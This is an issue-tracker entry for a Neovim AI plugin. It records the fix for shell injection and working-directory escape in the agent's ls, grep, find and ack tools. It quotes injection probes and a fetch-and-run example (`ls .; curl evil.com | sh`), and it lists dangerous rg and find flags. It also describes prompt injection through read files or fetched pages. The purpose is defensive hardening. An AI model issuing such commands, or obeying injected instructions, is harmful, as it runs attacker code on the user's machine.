---
id: 000144
status: working
deps: []
github_issue:
created: 2026-06-26
updated: 2026-06-26
estimate_hours: 4.0
started: 2026-06-26T09:28:30-07:00
actual_hours: 3.2
---

# tool input safety: ls/grep/find shell injection + cwd escape

## Problem

`ls`/`grep`/`find` (`lua/parley/tools/builtin/{ls,grep,find}.lua`) build
`vim.fn.system(cmd .. " " .. input.command)` — the LLM's `command` argument is
concatenated into a **shell** string with **zero** sanitization. So they are
de-facto an arbitrary-shell tool. Verified empirically (2026-06-26, non-destructive):

| probe | result |
|---|---|
| `ls ". ; echo INJECTED"` | executed — `;` chains arbitrary commands |
| `ls "$(echo SUBST)"` | expanded — `$(…)` command substitution runs |
| `ls /` | listed root — **not** confined to cwd |

So `ls .; curl evil.com \| sh` runs. The `"Confined to the working directory"`
line in all three descriptions is **false**, and this is reachable via prompt
injection (a malicious file read into context, or a `web_fetch`'d page, can
instruct exactly this). The #140 cwd-guard (`resolve_path_in_cwd`) only checks
`path`/`file_path` fields — not the freeform `command` string — so it does not
cover these tools.

Found while scoping #139 (output safety); split out as the higher-urgency,
security-critical half.

## Spec

Keep the familiar tool names and common shell-shaped affordances, but move the
trust boundary away from a raw shell string:

- `ls`, `grep`, and `find` stay as builtin read tools; optional `ack` follows the
  same safety contract when installed. Their descriptions should continue to
  teach common command-like usage, because agents already know these tools from
  training data.
- Replace each raw `command` string with structured argv-like fields: a primary
  `path`/`paths` field, tool-specific fields (`pattern`, `glob`, `type`,
  `maxdepth`, context counts), and a conservative `flags` array for common safe
  flags.
- Build argv lists and execute the named binary directly (`vim.fn.system({ ... })`
  or the local equivalent), never via shell-string concatenation. Shell
  metacharacters are data, not syntax.
- Validate `flags` against a per-tool allowlist before execution. Reject unknown
  flags, flags that imply mutation/execution, and any option shape that would
  introduce a second command or filesystem write.
- The allowlists are positive lists, not denylists. This matters because argv
  execution neutralizes shell syntax, but valid binary flags can still execute
  programs or write files.
- Reuse the existing dispatcher `resolve_path_in_cwd` guard for all path-bearing
  fields, honoring `tool_read_roots` for read tools. This keeps cwd/read-root
  policy single-sourced (`ARCH-DRY`) and puts validation in pure helpers with
  thin handler IO (`ARCH-PURE`).
- Explicitly defer safe pipe composition (`ls | wc`) out of this issue. A secure
  read-only pipeline language is possible, but building one here would expand the
  attack surface and delay the core fix. This issue's purpose is to stop shell
  injection and cwd escape for the existing tools (`ARCH-PURPOSE`).

Tool-specific contract:

- `ls`: accept `path` plus common display flags such as `-a`, `-l`, `-h`, `-R`,
  `-t`, `-r`, `-S`, `-1`, `-d`, and `-F`, plus compact combinations when every
  character is allowlisted. Reject `--` long flags and shell globs as syntax; if
  needed later, add a separate structured `glob` field.
- `grep`: prefer `rg` when available, as today. Accept `pattern`, `path`/`paths`,
  optional `glob`, `type`, `ignore_case`, and context counts. Allow common
  read-only flags that affect matching/output, not process execution or writes:
  `-n`/`--line-number`, `-w`/`--word-regexp`, `-F`/`--fixed-strings`,
  `--hidden`, and `--no-ignore`. Explicitly reject `rg` command-execution and
  arbitrary-read flags such as `--pre`, `--pre-glob`, `--hostname-bin`, and
  `-f`/`--file`.
- `find`: accept `path`, `name`/`iname`, `type`, and `maxdepth`/`mindepth`.
  Do not expose a generic `flags` escape hatch for `find`; keep this narrower
  than arbitrary `find` because `find` is a command language, not just a file
  lister. Explicitly test that action/write predicates such as `-exec`,
  `-execdir`, `-delete`, `-ok`, `-okdir`, `-fprint`, `-fprintf`, and `-fls`
  remain unavailable.
- `ack`: when installed, accept `pattern`, `path`/`paths`, optional `type`,
  `ignore_case`, and context counts. Do not expose the legacy raw `command`
  string or a generic `flags` array. Insert `--` before pattern/path positionals
  so dash-leading patterns are searched literally.

## Done when

- `ls`/`grep`/`find` and installed optional `ack` cannot execute anything beyond
  their named binary — no shell metacharacter injection (`;`, `|` to
  non-allowlisted, `$()`, backticks, `>`).
- Path args are confined to cwd (+ configured `tool_read_roots`, #140); the
  descriptions' "confined to cwd" claim becomes true (or is corrected).
- Safe pipe composition is either implemented (allowlist) or explicitly deferred.
- Regression tests for each injection vector above.

## Estimate

```estimate
model: estimate-logic-v2
familiarity: 1.0
item: lua-neovim design=0.8 impl=2.5
item: atlas-docs design=0.0 impl=0.2
item: milestone-review design=0.0 impl=0.3
design-buffer: 0.30
total: 4.0
```

## Plan

- [x] Write durable implementation plan in `workshop/plans/000144-tool-input-safety-ls-grep-find-shell-injection-cwd-escape-plan.md`.
- [x] Replace raw shell-string execution for `ls`/`grep`/`find` with validated argv execution.
- [x] Route every path-like input through the existing cwd/read-root guard.
- [x] Add regression tests for metacharacter injection, command substitution, pipeline rejection, and cwd escape.
- [x] Update tool descriptions and atlas safety docs to match the new contract.
- [x] Fold installed optional `ack` into the same structured argv safety contract.

## Log

### 2026-06-26
- 2026-06-26: reopened — boundary review found installed optional `ack` was still
  registered with a raw `command` string despite sharing the same provider/tool
  safety surface.
- 2026-06-26: closed — judgment actual 3.2h because sdlc actual found no measurable activity; verified after REWORK fix with make test-spec SPEC=providers/tool_use, make test, and make lint all passed; review verdict: FIX-THEN-SHIP
- 2026-06-26: closed — judgment actual 3.0h because sdlc actual found no measurable activity; verified make test-spec SPEC=providers/tool_use, make test, and make lint all passed; review verdict: REWORK
- 2026-06-26: reopened — boundary review found `grep.pattern` could be parsed as an option without an argv `--` separator.

- Ran `/Users/xianxu/workspace/ariadne/bin/sdlc start-plan --issue 144`; design must satisfy `ARCH-DRY`, `ARCH-PURE`, and `ARCH-PURPOSE`.
- Design decision: keep familiar `ls`/`grep`/`find` tool names and command-like flags, but replace raw shell fragments with structured argv fields plus conservative validation. Defer pipe composition rather than shipping a brittle shell parser.
- Wrote durable implementation plan at `workshop/plans/000144-tool-input-safety-ls-grep-find-shell-injection-cwd-escape-plan.md`; estimate derived with `estimate-logic-v2`.
- Plan-quality gate failed usefully: the first plan did not enumerate the
  allowlists or test argv-surviving execution/write flags. Revised the issue and
  plan to use positive allowlists and explicit tests for `rg --pre`/`--hostname-bin`
  and `find -execdir`/`-fprint*`-style vectors.
- `sdlc change-code --issue 144` passed plan-quality/estimate-quality and created
  branch `000144-tool-input-safety-ls-grep-find-shell-injection-cwd-escape`.
- Implemented `lua/parley/tools/builtin/argv.lua` as the pure allowlist/argv
  helper, rewired `ls`/`grep`/`find` to structured argv execution, and extended
  the dispatcher path prelude to canonicalize `paths` arrays.
- Added regression coverage for shell metacharacter flags, command substitution
  as data, `rg --pre`/`--pre-glob`/`--hostname-bin`/`-f`, absent raw `find.flags`,
  legacy raw `command` fields, and `paths` array cwd/read-root confinement.
- Updated `atlas/providers/tool_use.md`, `atlas/traceability.yaml`, and refreshed
  golden payload fixtures for the changed tool schemas.
- Verification: `make test-spec SPEC=providers/tool_use` passed; `make test`
  passed; `make lint` passed.
- Fixed boundary-review REWORK: `grep` now inserts `--` before pattern/path
  positionals, so dash-leading patterns like `--files` and `--pre=/bin/echo`
  are searched literally rather than parsed as options. Added regression tests
  for that vector.
- Added dispatcher `default_path` support so `grep`'s omitted `path` defaults to
  `"."` before cwd/read-root canonicalization, not inside the handler after the
  path prelude.
- Fixed boundary-review FIX-THEN-SHIP gap: installed optional `ack` now uses the
  same structured argv pattern, declares `default_path = "."`, rejects legacy
  raw `command`/`flags`, and tests command-substitution text plus dash-leading
  patterns as data.
- Verification after the `ack` fix: direct
  `nvim --headless --noplugin -u tests/minimal_init.vim -c "PlenaryBustedFile tests/unit/tools_builtin_ack_spec.lua" -c "qa!"`
  passed; `make test-spec SPEC=providers/tool_use` passed and includes the ack
  spec; `make test` passed; `make lint` passed.

## Revisions

### 2026-06-26T10:16:17-0700

- Reason: operator challenged the first structured-tool proposal as too far from
  tools agents know how to use from training data.
- Delta: revised the design to preserve familiar tool names and common safe flags
  while still eliminating the raw shell string boundary.

### 2026-06-26T10:32:00-0700

- Reason: `sdlc change-code` plan-quality judge found the trust-boundary surface
  was underspecified: valid argv flags can still execute programs or write files.
- Delta: converted the spec from "conservative flags" to concrete positive
  allowlists, removed generic `find.flags`, and added required tests for
  argv-surviving RCE/write options.

### 2026-06-26T12:08:00-0700

- Reason: boundary review found optional `ack` is registered on hosts where it is
  installed and still used a raw shell command string.
- Delta: fold `ack` into the #144 safety boundary with structured fields,
  argv-list execution, dispatcher-confined default path handling, and regression
  tests for legacy raw commands, shell substitution text, dash-leading patterns,
  and raw flag rejection.
